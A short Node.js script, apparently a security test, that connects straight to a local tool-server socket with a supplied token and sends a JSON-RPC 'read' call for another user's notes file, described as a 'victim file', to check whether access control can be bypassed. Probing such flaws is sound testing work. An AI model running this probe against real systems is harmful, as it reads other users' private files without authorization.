// Connect straight to tools.sock with a given token and try to read a victim file.
import net from 'node:net'
const token = process.argv[2]
const s = net.createConnection('/run/mycel/tools.sock')
let buf = ''
s.on('connect', () => {
  s.write(JSON.stringify({ hello: { token } }) + '\n')
  s.write(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'read', arguments: { file_path: 'users/bob/notes.md' } } }) + '\n')
})
s.on('data', (d) => { buf += d; if (buf.includes('\n')) { console.log(buf.split('\n')[0].slice(0, 250)); process.exit(0) } })
s.on('error', (e) => { console.log('error', e.message); process.exit(0) })
setTimeout(() => { console.log('timeout', buf.slice(0, 200)); process.exit(0) }, 5000)
